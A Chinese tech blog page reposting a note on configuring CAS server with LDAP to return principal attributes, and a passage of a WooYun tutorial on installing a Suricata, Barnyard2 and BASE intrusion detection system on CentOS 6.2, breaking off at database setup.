
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 83 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-CAS--关于cas-server-webappforldap的principal其他属性返回的问题-/">关于cas</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-CAS--关于cas-server-webappforldap的principal其他属性返回的问题-/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-cas-server-webapp-for-ldap-principal-blogjava">关于cas-server-webapp for ldap的principal其他属性返回的问题 - 贝贝爸爸的程序人生 - BlogJava</h1>
<h1 id="-http-www-blogjava-net-yuanqixun-"><a href="http://www.blogjava.net/yuanqixun/" target="_blank">贝贝爸爸的程序人生</a></h1>
<p>关注Seam、BPM</p>
<p>posts - 23, comments - 6, trackbacks - 0, articles - 32   <a href="http://www.blogjava.net/" target="_blank">BlogJava</a> :: <a href="http://www.blogjava.net/yuanqixun/" target="_blank">首页</a> :: <a href="http://www.blogjava.net/yuanqixun/admin/EditPosts.aspx?opt=1" target="_blank">新随笔</a> :: <a href="http://www.blogjava.net/yuanqixun/contact.aspx?id=1" target="_blank">联系</a> :: <a href="http://www.blogjava.net/yuanqixun/rss" target="_blank">聚合</a> <a href="http://www.blogjava.net/yuanqixun/rss" target="_blank"><img src="" alt=""></a> :: <a href="http://www.blogjava.net/yuanqixun/admin/EditPosts.aspx" target="_blank">管理</a> <img src="" alt=""></p>
<h3 id="-">日历</h3>
<p><a href="&quot;Go to the previous month&quot;">&lt;</a>2012年4月<a href="&quot;Go to the next month&quot;">&gt;</a>日一二三四五六25262728293031123<a href="http://www.blogjava.net/yuanqixun/archive/2012/04/04.html" target="_blank">4</a>5678910111213141516171819<a href="http://www.blogjava.net/yuanqixun/archive/2012/04/20.html" target="_blank">20</a>21222324<a href="http://www.blogjava.net/yuanqixun/archive/2012/04/25.html" target="_blank">25</a><a href="http://www.blogjava.net/yuanqixun/archive/2012/04/26.html" target="_blank">26</a>2728293012345</p>
<p><img src="" alt=""></p>
<h3 id="-">常用链接</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/MyPosts.html" target="_blank">我的随笔</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/MyComments.html" target="_blank">我的评论</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/OtherPosts.html" target="_blank">我的参与</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/RecentComments.html" target="_blank">最新评论</a>
<img src="" alt=""></li>
</ul>
<h3 id="-1-">留言簿(1)</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/Contact.aspx?id=1" target="_blank">给我留言</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/default.aspx?opt=msg" target="_blank">查看公开留言</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/admin/MyMessages.aspx" target="_blank">查看私人留言</a></li>
</ul>
<p><img src="" alt=""></p>
<h3 id="-19-">随笔分类(19)</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/category/51531.html/rss" title="Subscribe to CAS(1)" target="_blank"><img src="&quot;Subscribe to CAS(1" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/51531.html" target="_blank">CAS(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48487.html/rss" title="Subscribe to 我的儿子(1)" target="_blank"><img src="&quot;Subscribe to 我的儿子(1" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48487.html" target="_blank">我的儿子(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48486.html/rss" title="Subscribe to 生活感悟(1)" target="_blank"><img src="&quot;Subscribe to 生活感悟(1" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48486.html" target="_blank">生活感悟(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48485.html/rss" title="Subscribe to 程序人生(16)" target="_blank"><img src="&quot;Subscribe to 程序人生(16" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48485.html" target="_blank">程序人生(16)</a>
<img src="" alt=""></li>
</ul>
<h3 id="-40-">随笔档案(40)</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2012/05.html" target="_blank">2012年5月 (2)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2012/04.html" target="_blank">2012年4月 (4)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2012/03.html" target="_blank">2012年3月 (7)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2012/02.html" target="_blank">2012年2月 (2)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/08.html" target="_blank">2011年8月 (1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/07.html" target="_blank">2011年7月 (1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/06.html" target="_blank">2011年6月 (1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05.html" target="_blank">2011年5月 (21)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2008/07.html" target="_blank">2008年7月 (1)</a></li>
</ul>
<p><img src="" alt=""></p>
<h3 id="-17-">文章分类(17)</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/category/48484.html/rss" title="Subscribe to BPM(1)" target="_blank"><img src="&quot;Subscribe to BPM(1" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48484.html" target="_blank">BPM(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48754.html/rss" title="Subscribe to GIT(2)" target="_blank"><img src="&quot;Subscribe to GIT(2" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48754.html" target="_blank">GIT(2)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/49452.html/rss" title="Subscribe to J2EE(2)" target="_blank"><img src="&quot;Subscribe to J2EE(2" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/49452.html" target="_blank">J2EE(2)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48483.html/rss" title="Subscribe to Linux(9)" target="_blank"><img src="&quot;Subscribe to Linux(9" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48483.html" target="_blank">Linux(9)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48482.html/rss" title="Subscribe to Seam2" target="_blank"><img src="&quot;Subscribe to Seam2&quot;" alt=""></a><a href="http://www.blogjava.net/yuanqixun/category/48482.html" target="_blank">Seam2</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48545.html/rss" title="Subscribe to Seam3(1)" target="_blank"><img src="&quot;Subscribe to Seam3(1" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48545.html" target="_blank">Seam3(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/category/48715.html/rss" title="Subscribe to 数据库(2)" target="_blank"><img src="&quot;Subscribe to 数据库(2" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/category/48715.html" target="_blank">数据库(2)</a>
<img src="" alt=""></li>
</ul>
<h3 id="-12-">文章档案(12)</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/archives/2011/11.html" target="_blank">2011年11月 (6)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archives/2011/10.html" target="_blank">2011年10月 (2)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archives/2011/08.html" target="_blank">2011年8月 (3)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archives/2011/07.html" target="_blank">2011年7月 (1)</a></li>
</ul>
<p><img src="" alt=""></p>
<h3 id="-25-">收藏夹(25)</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/favorite/48642.html/rss" title="Subscribe to git(15)" target="_blank"><img src="&quot;Subscribe to git(15" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/favorite/48642.html" target="_blank">git(15)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/favorite/48644.html/rss" title="Subscribe to HttpComponent(2)" target="_blank"><img src="&quot;Subscribe to HttpComponent(2" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/favorite/48644.html" target="_blank">HttpComponent(2)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/favorite/49099.html/rss" title="Subscribe to JBOSS(1)" target="_blank"><img src="&quot;Subscribe to JBOSS(1" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/favorite/49099.html" target="_blank">JBOSS(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/favorite/51142.html/rss" title="Subscribe to linux" target="_blank"><img src="&quot;Subscribe to linux&quot;" alt=""></a><a href="http://www.blogjava.net/yuanqixun/favorite/51142.html" target="_blank">linux</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/favorite/48645.html/rss" title="Subscribe to seam3(7)" target="_blank"><img src="&quot;Subscribe to seam3(7" alt="">&quot;)</a><a href="http://www.blogjava.net/yuanqixun/favorite/48645.html" target="_blank">seam3(7)</a>
<img src="" alt=""></li>
</ul>
<h3 id="-">常用链接</h3>
<ul>
<li><a href="http://wiki.nginx.org/Chs" target="_blank">Nginx中文</a></li>
</ul>
<p><img src="" alt=""></p>
<h3 id="-">搜索</h3>
<ul>
<li><img src="" alt=""></li>
</ul>
<h3 id="-http-www-blogjava-net-yuanqixun-commentsrss-aspx-">最新评论 <a href="http://www.blogjava.net/yuanqixun/CommentsRSS.aspx" target="_blank"><img src="" alt=""></a></h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2012/03/15/364865.html#371970" target="_blank">1. re: Fedora16下安装mysql[未登录]</a></li>
<li>评论内容较长,点击标题查看</li>
<li>--fg</li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2012/01/04/364865.html#367842" target="_blank">2. re: Fedora16下安装mysql[未登录]</a></li>
<li>评论内容较长,点击标题查看</li>
<li>--fedora</li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/08/12/351379.html#356402" target="_blank">3. re: 关于GIT Flow的学习理解[未登录]</a></li>
<li>嘿嘿，被我发现了吧
我告诉你的喽。。。</li>
<li>--dd</li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/08/12/349819.html#356362" target="_blank">4. re: centos下samba的安装配置</a></li>
<li>谢谢楼主，简单明了</li>
<li>--里一方</li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/08/349765.html#349789" target="_blank">5. re: 正在安装Fedora操作系统</a></li>
<li>嗯，自己开发倒没问题，问题就是不好和公司其他同事沟通，例如公司的oa系统就只能ie，唉。linux应用还是很多阻力。</li>
<li>--贝贝爸爸</li>
</ul>
<p><img src="" alt=""></p>
<h3 id="-">阅读排行榜</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/18/350525.html" target="_blank">1. CentOS下安装postgresql(369)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/26/351057.html" target="_blank">2. 在centos下配置gitosis(364)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/11/349988.html" target="_blank">3. 【转】centos卸载系统与环境部署(340)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/09/349819.html" target="_blank">4. centos下samba的安装配置(263)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/10/349909.html" target="_blank">5. 在CentOS下安装配置git(167)</a>
<img src="" alt=""></li>
</ul>
<h3 id="-">评论排行榜</h3>
<ul>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/08/349765.html" target="_blank">1. 正在安装Fedora操作系统(2)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/09/349819.html" target="_blank">2. centos下samba的安装配置(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/31/351379.html" target="_blank">3. 关于GIT Flow的学习理解(1)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/27/351210.html" target="_blank">4. 【转】在CentOS下安装配置postgresql8.3(0)</a></li>
<li><a href="http://www.blogjava.net/yuanqixun/archive/2011/05/26/351129.html" target="_blank">5. Mysql常用命令(0)</a> ## <a href="">关于cas-server-webapp for ldap的principal其他属性返回的问题</a></li>
</ul>
<p>Posted on 2012-04-25 23:12 <a href="http://www.blogjava.net/yuanqixun/" target="_blank">贝贝爸爸</a> 阅读(44) <a href="http://www.blogjava.net/yuanqixun/archive/2012/04/25/376638.html#Post" target="_blank">评论(0)</a>  <a href="http://www.blogjava.net/yuanqixun/admin/EditPosts.aspx?postid=376638" target="_blank">编辑</a>  <a href="http://www.blogjava.net/yuanqixun/AddToFavorite.aspx?id=376638" target="_blank">收藏</a> 所属分类: <a href="http://www.blogjava.net/yuanqixun/category/51531.html" target="_blank">CAS</a> <img src="" alt=""></p>
<p>nnd，今天搞了快2个小时，总是无法解决ldap支持的其他属性返回问题，因为之前配置的是3.3.5版本，现在最新的版本是3.4.11，原来的配置竟然无法使用了，原来是因为增加服务：</p>
<p><bean id="serviceRegistryDao" class="org.jasig.cas.services.InMemoryServiceRegistryDaoImpl">
导致无法返回principal的其他属性到客户端，其实象这样配置即可：<bean id="attributeRepository"
  class="org.jasig.services.persondir.support.ldap.LdapPersonAttributeDao">
  <property name="contextSource" ref="contextSource" />
  <property name="baseDN" value="ou=users,${ldap.basePath}" />
  <property name="requireAllQueryAttributes" value="true" />
  <!--
  Attribute mapping beetween principal (key) and LDAP (value) names
  used to perform the LDAP search.  By default, multiple search criteria
  are ANDed together.  Set the queryType property to change to OR.
  -->
  <property name="queryAttributeMapping">
    <map>
      <entry key="username" value="uid" />
    </map>
  </property></p>
  <property name="resultAttributeMapping">
    <map>
    <!-- Mapping beetween LDAP entry attributes (key) and Principal's (value) -->
    <entry key="name" value="userName"/>
    <entry key="uid" value="userId"/>
    </map>
  </property>
</bean>
    <bean id="serviceRegistryDao" class="org.jasig.cas.services.InMemoryServiceRegistryDaoImpl">
        <property name="registeredServices">
            <list>
                <bean class="org.jasig.cas.services.RegisteredServiceImpl">
                    <property name="id" value="0" />
                    <property name="name" value="HTTP" />
                    <property name="description" value="Only Allows HTTP Urls" />
                    <property name="serviceId" value="http:///*/*" />
                    <property name="evaluationOrder" value="10000001" />
                    <property name="ignoreAttributes" value="true" />
                </bean>
                                ………………
                        </list>
                </property>
        </bean> 如上所示，其中注册的服务registeredServices
默认是不允许返回其他属性到客户端的！！！！！，真的是很坑爹啊，不过，配置一下ignoreAttributes即可，也可以指定allowedAttributes
如下：
<property name="allowedAttributes">
    <list>
            <value><!-- your attribute key --></value>
    </list>
</property>

<p><a href="http://www.blogjava.net/RequireRegister.aspx" target="_blank">新用户注册</a>  <a href="">刷新评论列表</a>  </p>
<p><a href=""></a> <a href="http://q.cnblogs.com/">博问 - 解决您的IT难题</a>   <a href="http://www.cnblogs.com/" target="_blank">博客园</a>  <a href="http://q.cnblogs.com/" target="_blank">博问</a>  <a href="http://news.cnblogs.com/" target="_blank">IT新闻</a>  <a href="http://job.cnblogs.com/cate-java_programmer/" target="_blank">Java程序员招聘</a> 标题  请输入标题 姓名  请输入你的姓名 主页 请输入验证码 验证码 /*  <img src="" alt=""> 内容(请不要发表任何与政治相关的内容) 请输入评论内容 Remember Me?   <a href="http://www.blogjava.net/login.aspx?ReturnURL=http://www.blogjava.net/yuanqixun/archive/2012/04/25/376638.html&amp;SourceURL=/yuanqixun/archive/2012/04/25/376638.html" target="_blank">登录</a>       [使用Ctrl+Enter键可以直接提交]    IT新闻：
· <a href="http://news.cnblogs.com/n/149144/" target="_blank">指尖上的体验：从可折叠iPhone物理键盘Spike说起</a>
· <a href="http://news.cnblogs.com/n/149143/" target="_blank">解密腾讯星云</a>
· <a href="http://news.cnblogs.com/n/149142/" target="_blank">图书出版业如何应对数字盗版</a>
· <a href="http://news.cnblogs.com/n/149141/" target="_blank">资本局中局：成也萧何败也萧何</a>
· <a href="http://news.cnblogs.com/n/149138/" target="_blank">微软本周发布9个补丁 影响所有Windows/Office</a></p>
<p>博客园首页随笔：
· <a href="http://www.cnblogs.com/wangjq/archive/2012/07/09/2582485.html" target="_blank">设计模式学习笔记-适配器模式</a>
· <a href="http://www.cnblogs.com/liusy1988/archive/2012/07/09/2570438.html" target="_blank">[原创]一起来做网页游戏---第一章 巧妇难为无米之炊</a>
· <a href="http://www.cnblogs.com/kaitao/archive/2012/07/09/2582571.html" target="_blank">Spring3开发实战 之 第二章：IoC/DI开发（1）</a>
· <a href="http://www.cnblogs.com/HuiTai/archive/2012/07/09/MVC-7.html" target="_blank">第七话 Asp.Net Mvc 3.0【MVC项目实战の三】</a>
· <a href="http://www.cnblogs.com/respawn/archive/2012/07/09/2582548.html" target="_blank">GNU C - Using GNU GCC <strong>attribute</strong> mechanism 01</a>
知识库：
· <a href="http://kb.cnblogs.com/page/148238/" target="_blank">Web前端：11个让你代码整洁的原则</a>
· <a href="http://kb.cnblogs.com/page/143279/" target="_blank">页面前端的水有多深？再议页面开发</a>
· <a href="http://kb.cnblogs.com/page/130367/" target="_blank">Fiddler 教程</a>
· <a href="http://kb.cnblogs.com/page/148772/" target="_blank">关于编程学习的七点思索</a>
· <a href="http://kb.cnblogs.com/page/115175/" target="_blank">一地鸡毛 — 软件项目中的人际困局</a>  网站导航:</p>
<p><a href="http://www.cnblogs.com/" title="程序员的网上家园" target="_blank">博客园</a>   <a href="http://news.cnblogs.com/" target="_blank">IT新闻</a>   <a href="http://kb.cnblogs.com/" target="_blank">知识库</a>   <a href="http://www.cppblog.com/" target="_blank">C++博客</a>   <a href="http://job.cnblogs.com/" target="_blank">程序员招聘</a>   <a href="http://www.blogjava.net/yuanqixun/archive/2012/04/25/376638.html?opt=admin" target="_blank">管理</a>    Powered by:
<a href="http://www.blogjava.net/" target="_blank">BlogJava</a>
Copyright © 贝贝爸爸</p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/CAS/">CAS</a></li></span></span> | <span class="tags">Tagged <a href="/tags/CAS/" class="label label-primary">CAS</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-CAS--关于cas-server-webappforldap的principal其他属性返回的问题-/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-CAS--关于cas-server-webappforldap的principal其他属性返回的问题-" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系/">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-入侵检测--CentOS62下安装基于SuricataBarnyard2Base的⼊侵检测系/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="centos-6-2-suricata-barnyard-2-base-wooyun-">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统 | WooYun知识库</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">WooYun知识库</a></h1>
<p><a href="http://drops.wooyun.org/login" title="登录" target="_blank">登录</a></p>
<p>像一朵乌云一样成长</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">首页</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">投稿</a>
<a href="http://drops.wooyun.org/" title="首页" target="_blank">首页</a> » <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a> » CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统</li>
</ul>
<h2 id="-centos-6-2-suricata-barnyard-2-base-http-drops-wooyun-org-tips-413-permanent-link-to-centos-6-2-suricata-barnyard-2-base-"><a href="http://drops.wooyun.org/tips/413" title="Permanent Link to CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统" target="_blank">CentOS 6.2下安装基于Suricata + Barnyard 2 + Base 的⼊侵检测系统</a></h2>
<p>2人收藏 <a href="">收藏</a></p>
<p>2013/08/05 19:24  | <a href="http://drops.wooyun.org/author/五道口杀气" title="由 五道口杀气 发布" target="_blank">五道口杀气</a>  | <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a>  | <a href="">占个座先</a></p>
<h2 id="0x00-">0x00 准备工作</h2>
<p>CentOS 6.2我是最小化安装，同时使用163的源进行update，所以还需要安装如下的依赖包：
[root@root ~]$ sudo yum install gcc make pcre pcre-devel libpcap libpcap-devel</p>
<p>同时需要关闭iptables、ip6tables：</p>
<p>[root@root ~]$ sudo service iptables stop [root@root ~]$ sudo service ip6tables stop [root@root ~]$ sudo chkconfig --level 2345 iptables off [root@root ~]$ sudo chkconfig --level 2345 ip6tables off</p>
<p>需要下载的软件：
Suricata <a href="http://www.openinfosecfoundation.org/index.php/downloads" target="_blank">http://www.openinfosecfoundation.org/index.php/downloads</a> Barnyard 2 <a href="http://www.securixlive.com/barnyard2/" target="_blank">http://www.securixlive.com/barnyard2/</a> Base <a href="http://base.secureideas.net/" target="_blank">http://base.secureideas.net/</a> yaml <a href="http://pyyaml.org/" target="_blank">http://pyyaml.org/</a> adodb <a href="http://sourceforge.net/projects/adodb/" target="_blank">http://sourceforge.net/projects/adodb/</a> rules <a href="http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz" target="_blank">http://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz</a> Image_Canvas <a href="http://download.pear.php.net/package/Image_Canvas-0.3.3.tgz" target="_blank">http://download.pear.php.net/package/Image_Canvas-0.3.3.tgz</a> Image_Graph <a href="http://download.pear.php.net/package/Image_Graph-0.8.0.tgz" target="_blank">http://download.pear.php.net/package/Image_Graph-0.8.0.tgz</a></p>
<h2 id="0x01-apm-">0x01 配置APM环境</h2>
<p>Base需要APM（Apache、PHP、Mysql）环境，通过yum来进行安装。
[root@root ids]$ sudo yum install httpd php mysql mysql-server mysql-devel php-mysql php-gd php-pear</p>
<p>启动httpd、mysql服务</p>
<p>[root@root ids]$ sudo /etc/init.d/httpd start [root@root ids]$ sudo /etc/init.d/mysqld start</p>
<p>默认的web根目录是</p>
<p>/var/www/html
，在此目录新建phpinfo测试文件，来确认配置是否正确。</p>
<p>PS：mysql安装后root账号默认口令为空，通过下面命令可以修改root账号口令
[root@root ~]$ mysqladmin -uroot -p password [新密码]</p>
<h2 id="0x02-barnyard-2">0x02 安装Barnyard 2</h2>
<p>安装过程如下：
[root@root ids]$ tar zxvf barnyard2-1.9.tar.gz [root@root ids]$ cd barnyard2-1.9 [root@root barnyard2-1.9]$ ./configure --with-mysql [root@root barnyard2-1.9]$ make [root@root barnyard2-1.9]$ sudo make install</p>
<h2 id="0x03-suricata">0x03 安装Suricata</h2>
<p>安装过程如下：</p>
<p>Suricata需要依赖yaml，首先安装yaml
[root@root ids]$ tar zxvf yaml-0.1.4.tar.gz [root@root ids]$ cd yaml-0.1.4 [root@root yaml-0.1.4]$ ./configure [root@root yaml-0.1.4]$ make [root@root yaml-0.1.4]$ sudo make install [root@root ids]$ tar zxvf suricata-1.1.1.tar.gz [root@root ids]$ cd suricata-1.1.1 [root@root suricata-1.1.1]$ ./configure [root@root suricata-1.1.1]$ make [root@root suricata-1.1.1]$ sudo make install</p>
<h2 id="0x04-suricata-barnyard-2">0x04 配置Suricata、Barnyard 2</h2>
<h3 id="-barnyard-2">配置Barnyard 2</h3>
<p>把Barnyard 2安装源文件中的</p>
<p>etc/barnyard2.conf
文件拷贝到Suricata的配置目录下
[root@root ids]$ cd barnyard2-1.9 [root@root barnyard2-1.9]$ sudo cp etc/barnyard2.conf /etc/suricata/</p>
<p>创建barnyard2日志目录</p>
<p>/var/log/barnyard2</p>
<p>[root@root ~]$ sudo mkdir /var/log/barnyard2</p>
<h3 id="-">配置数据库</h3>
